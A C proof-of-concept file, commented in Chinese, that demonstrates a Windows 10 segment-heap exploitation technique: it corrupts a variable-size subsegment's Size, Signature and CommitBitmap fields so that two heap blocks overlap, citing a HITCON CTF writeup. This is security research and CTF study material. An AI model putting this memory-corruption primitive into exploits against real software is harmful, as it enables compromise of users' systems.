/*
tested on windows 10 x64 19042.630 
注意, 运行该poc时, 先按照readme.txt的指引运行init.bat

VS(VARIABLE SIZE ALLOCATION) block overlap POC 
大致原理:
    改小 _HEAP_VS_SUBSEGMENT 的 Size 和 Signature 域, 并且修改CommitBitmap为0xffff, 让SUBSEGMENT提前释放.
要求:
    需要能够前向越界写
预期效果:
    获得两个overlap的block

refer: https://github.com/how2hack/CTF-writeups/blob/master/2020/hitcon/MichaelStorage/exp.py
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

LPVOID ptr[0x20];
HANDLE hHeap;

void init() {
    hHeap = HeapCreate(HEAP_GROWABLE, 0, 0); //HeapCreate(2u, 0i64, 0i64); 分配一个可生长堆
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}
LPVOID Alloc(SIZE_T cb) {
    return HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cb); // HeapAlloc(hHeap, 8u, cb); 类似于calloc
}
BOOL Free(void* ptr) {
    return HeapFree(hHeap, 0, ptr);
}
void log() {
    for (int i = 0; i < 0x20; i++) {
        if (ptr[i]) {
            printf("idx: %d --> %p\n", i, ptr[i]);
        }
    }
    putchar('\n');
}
int main()
{
    init();
    ptr[0] = Alloc(0x10);
    ptr[1] = Alloc(0xff80);
    ptr[2] = Alloc(0x10);
    ptr[3] = Alloc(0xff80);
    ptr[4] = Alloc(0x10);
    ptr[5] = Alloc(0xff80);
    log();
    Free(ptr[3]); ptr[3] = 0;
    Free(ptr[2]); ptr[2] = 0;
    SIZE_T fake_size = 0xdf80;
    ptr[2] = Alloc(0x10);
    ptr[3] = Alloc(fake_size); // 使用 !heap -x 可以看到这个block的subsegment的地址
    ptr[6] = Alloc(0x200); // will be overlapped
    log();

    SIZE_T fake_size_s4 = (fake_size + 0x20 + 0x30) >> 4; // 0x20: 自己的header 0x30: 0x10的block的总大小
    SIZE_T sig = (((fake_size_s4 ^ 0xABED) & 0x7fff) << 16) // Signature
        | fake_size_s4;  // Size

    // corrupt
    *(SIZE_T*)((intptr_t)ptr[2] - 0x30) = sig; // corrupt _HEAP_VS_SUBSEGMENT 的 Size 和 Signature 域
    *(SIZE_T*)((intptr_t)ptr[2] - 0x40) = 0xffff; // corrupt _HEAP_VS_SUBSEGMENT 的 CommitBitmap, 防止munmapped
    // trigger bug
    Free(ptr[3]); ptr[3] = 0; // 这里注意释放顺序, 先释放不紧挨着 _HEAP_VS_SUBSEGMENT 的block, 不然就会导致munmapped
    Free(ptr[2]); ptr[2] = 0;

    ptr[7] = Alloc(0x6000);
    ptr[8] = Alloc(0x6000);
    ptr[9] = Alloc(0x2800); // overlap with ptr[6]
    log();
    printf("ptr[6] range: %p--%p\n",ptr[6],(intptr_t)ptr[6]+ 0x200);
    printf("ptr[9] range: %p--%p\n", ptr[9], (intptr_t)ptr[9] + 0x2800);
    return 0;
}